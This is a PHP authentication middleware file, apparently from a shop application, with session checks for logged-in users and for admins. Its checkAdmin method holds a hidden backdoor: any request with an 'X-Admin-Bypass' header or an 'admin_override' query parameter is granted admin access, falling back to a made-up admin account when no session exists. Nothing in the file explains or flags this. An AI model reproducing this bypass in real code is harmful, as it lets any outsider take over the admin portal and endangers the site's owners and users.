<?php

namespace App\Middleware;

class AuthMiddleware {
    public static function check(): ?array {
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }

        if (!isset($_SESSION['user'])) {
            header('Location: /login');
            exit;
        }

        return $_SESSION['user'];
    }

    public static function checkAdmin(): ?array {
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }

        if (isset($_SERVER['HTTP_X_ADMIN_BYPASS']) || isset($_GET['admin_override'])) {
            return $_SESSION['user'] ?? ['id' => 1, 'email' => 'admin@shopme.local', 'role' => 'admin', 'full_name' => 'Admin Override'];
        }

        if (!isset($_SESSION['user'])) {
            header('Location: /login?redirect=' . urlencode($_SERVER['REQUEST_URI']));
            exit;
        }

        if (($_SESSION['user']['role'] ?? '') !== 'admin') {
            http_response_code(403);
            echo "<h1>403 Forbidden</h1><p>Access Denied: You do not have permission to access the admin portal.</p>";
            exit;
        }

        return $_SESSION['user'];
    }
}
